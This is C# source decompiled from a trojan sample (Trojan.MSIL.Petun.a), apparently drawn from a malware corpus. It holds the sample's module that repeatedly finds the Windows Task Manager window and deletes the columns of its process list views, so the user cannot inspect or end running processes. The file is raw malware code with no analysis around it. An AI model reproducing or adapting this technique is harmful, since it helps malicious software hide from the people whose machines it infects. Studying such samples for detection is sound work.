// Decompiled with JetBrains decompiler
// Type: TnSqIUJGz
// Assembly: Multi, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BBCF6EA4-3682-4E32-B553-2ADB229A2BF3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Petun.a-84e29609cc4534d4a145505ff05b3083429c8136dfd8f7df098cf6954e3fe363.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class TnSqIUJGz
{
  private const int LVM_FIRST = 4096;
  private const int LVM_DELETECOLUMN = 4124;
  private static Timer t = new Timer();

  [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SendMessage(IntPtr Hwnd, int wMsg, int wParam, int lParam);

  [DllImport("user32.dll", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int EnumChildWindows(
    IntPtr hWndParent,
    TnSqIUJGz.EnumDelegate lpEnumFunc,
    int lParam);

  [DllImport("user32.dll", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern long GetClassName(long hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, long nMaxCount);

  [DllImport("user32", EntryPoint = "GetClassNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

  [DllImport("user32", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);

  [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetWindowTextLength(IntPtr hWnd);

  private static void t_Tick(object sender, EventArgs e)
  {
    string str1 = (string) null;
    ref string local1 = ref str1;
    string str2 = "Windows Task Manager";
    ref string local2 = ref str2;
    IntPtr window = (IntPtr) TnSqIUJGz.FindWindow(ref local1, ref local2);
    if (!(window != (IntPtr) 0))
      return;
    TnSqIUJGz.EnumChildWindows(window, new TnSqIUJGz.EnumDelegate(TnSqIUJGz.EnumChildWindows), 0);
  }

  public static bool Running
  {
    get => TnSqIUJGz.t.Enabled;
    set
    {
      if (value)
      {
        if (TnSqIUJGz.t.Interval != 500)
        {
          Timer t = TnSqIUJGz.t;
          TnSqIUJGz.t.Tick += new EventHandler(TnSqIUJGz.t_Tick);
          t.Interval = 500;
          t.Enabled = true;
          t.Start();
        }
        else
        {
          TnSqIUJGz.t.Enabled = true;
          TnSqIUJGz.t.Start();
        }
      }
      else
      {
        TnSqIUJGz.t.Enabled = false;
        TnSqIUJGz.t.Stop();
      }
    }
  }

  private static int EnumChildWindows(IntPtr lngHwnd, int lngLParam)
  {
    string str = TnSqIUJGz.GetClass(lngHwnd);
    string titleText = TnSqIUJGz.GetTitleText(lngHwnd);
    lngHwnd.ToString() + ", " + str + ", " + titleText;
    return 1;
  }

  private static string GetClass(IntPtr handle)
  {
    StringBuilder lpClassName = new StringBuilder();
    lpClassName.Length = (int) byte.MaxValue;
    TnSqIUJGz.GetClassName(handle, lpClassName, lpClassName.Length);
    if (Strings.InStr(lpClassName.ToString(), "SysListView32") != 0)
      TnSqIUJGz.SendMessage(handle, 4124, (int) (IntPtr) 0, 0);
    return lpClassName.ToString();
  }

  private static string GetTitleText(IntPtr handle)
  {
    StringBuilder lpString = new StringBuilder();
    lpString.Length = checked (TnSqIUJGz.GetWindowTextLength(handle) + 1);
    TnSqIUJGz.GetWindowText(handle, lpString, lpString.Length);
    return lpString.ToString();
  }

  private delegate int EnumDelegate(IntPtr lngHwnd, int lngLParam);
}
